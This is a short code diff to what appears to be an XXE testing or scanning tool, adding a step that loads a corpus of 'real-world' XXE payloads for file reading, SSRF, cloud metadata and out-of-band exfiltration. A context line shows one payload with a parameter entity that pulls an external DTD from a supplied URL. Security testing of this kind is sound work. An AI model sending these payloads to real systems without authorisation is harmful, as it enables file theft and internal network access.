@@ -79,6 +79,16 @@ def build_payloads(canary: str, oob_url: str | None) -> dict[str, str]:
             f'<!DOCTYPE r [<!ENTITY % ext SYSTEM "{oob_url}/xxe.dtd"> %ext;]>'
             '<root><a>oob</a></root>'
         )
+    # Append real-world XXE payloads (file-read / SSRF / metadata / OOB variants).
+    try:
+        from tools.payload_loader import load_blocks
+        for i, block in enumerate(load_blocks("xxe", CANARY=canary, OOB=(oob_url or "")), 1):
+            # OOB-dependent (parameter-entity) blocks need an OOB URL — skip without one.
+            if not oob_url and ("%p;" in block or "%e;" in block):
+                continue
+            payloads[f"corpus_{i}"] = block
+    except Exception:
+        pass
     return payloads
 
 
